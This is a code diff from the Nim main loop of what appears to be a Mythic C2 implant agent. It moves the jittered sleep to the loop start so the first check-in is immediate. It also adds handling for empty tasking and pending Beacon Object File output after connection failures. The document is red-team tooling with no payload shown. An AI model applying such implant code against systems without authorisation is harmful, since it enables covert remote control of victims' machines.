@@ -1607,9 +1607,28 @@ proc runAgent*() =
   debugLog "agent", "runAgent: Checkin successful, entering main loop"
   
   # Main agent loop
+  var firstLoop = true
   while not agentInstance.shouldExit:
+    # Sleep with jitter (skip on first iteration so first checkin is immediate)
+    if firstLoop:
+      firstLoop = false
+    else:
+      agentInstance.sleep()
+    
     # Get tasking from Mythic (returns tasks, interactive, socks, rpfwd messages, and delegates)
     let (tasks, interactive, socksMessages, rpfwdMessages, delegates) = agentInstance.getTasks()
+    
+    # If getTasks returned nothing (connection failure), skip straight back to sleep
+    if tasks.len == 0 and interactive.len == 0 and socksMessages.len == 0 and rpfwdMessages.len == 0 and delegates.len == 0:
+      # Still check for background task output and post any pending responses
+      agentInstance.checkBackgroundTasks()
+      when defined(cmd_inline_execute) and defined(windows):
+        let bofResponses = checkActiveBofSessions()
+        for response in bofResponses:
+          agentInstance.taskResponses.add(response)
+      if agentInstance.taskResponses.len > 0:
+        agentInstance.postResponses()
+      continue
     
     # Process interactive messages first (PTY input)
     agentInstance.processInteractive(interactive)
@@ -1694,8 +1713,5 @@ proc runAgent*() =
       
       if hasP2pData:
         agentInstance.postResponses()
-    
-    # Sleep with jitter
-    agentInstance.sleep()
 
 
